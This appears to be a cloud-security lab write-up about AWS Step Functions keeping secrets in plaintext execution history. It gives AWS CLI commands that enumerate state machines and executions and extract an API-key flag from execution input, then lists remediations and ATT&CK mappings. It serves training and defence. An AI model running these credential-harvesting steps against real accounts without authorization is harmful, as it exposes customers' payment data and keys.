# Step Functions — Sensitive Data in Execution History

**Provider:** AWS | **Category:** Serverless / Data Exposure

## Scenario

A production order-processing workflow passes customer payment data and internal API
keys as **input to Step Functions executions**. The full input and output of every
execution is retained in the execution history for **90 days by default**, and is
returned in plaintext by `states:GetExecutionHistory`.

Any IAM identity with `states:ListExecutions` and `states:GetExecutionHistory` can
read the input of every past execution — including sensitive data that was never
intended to be logged.

## Attack Path

```
[Attacker] sfn-reader-<id> (states:ListStateMachines + states:ListExecutions + states:GetExecutionHistory)
    |
    v
aws stepfunctions list-state-machines  -->  find cumulonimbus-workflow-* ARN
    |
    v
aws stepfunctions list-executions --state-machine-arn <arn>  -->  execution ARNs
    |
    v
aws stepfunctions get-execution-history --execution-arn <arn>
    |
    v
events[?type=='ExecutionStarted'].executionStartedEventDetails.input  -->  JSON with flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — Find the state machine

```bash
aws stepfunctions list-state-machines \
  --profile attacker \
  --query "stateMachines[?contains(name,'cumulonimbus')].{Name:name,Arn:stateMachineArn}"
```

### Step 3 — List executions

```bash
SM_ARN="<state_machine_arn>"

aws stepfunctions list-executions \
  --state-machine-arn "${SM_ARN}" \
  --profile attacker \
  --query "executions[*].{Name:name,Arn:executionArn,Status:status}"
```

### Step 4 — Read execution input

```bash
EXEC_ARN="<execution_arn>"

aws stepfunctions get-execution-history \
  --execution-arn "${EXEC_ARN}" \
  --profile attacker \
  --query "events[?type=='ExecutionStarted'].executionStartedEventDetails.input" \
  --output text | jq .
```

The `internalApiKey` field in the input JSON contains the flag.

## How to Fix in Production

1. **Never pass secrets as execution input** — use SSM Parameter Store or Secrets
   Manager and pass ARNs; retrieve the actual value inside a Lambda task.
2. **Enable execution data encryption** using a customer-managed KMS key:
   ```hcl
   encryption_configuration {
     kms_key_id = aws_kms_key.sfn.arn
   }
   ```
3. **Restrict `states:GetExecutionHistory`** to only the roles that operate the
   workflow — it is often granted together with broader Step Functions read access.
4. **Reduce execution history retention** by enabling Express Workflows (which log
   to CloudWatch Logs with configurable retention) instead of Standard Workflows.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
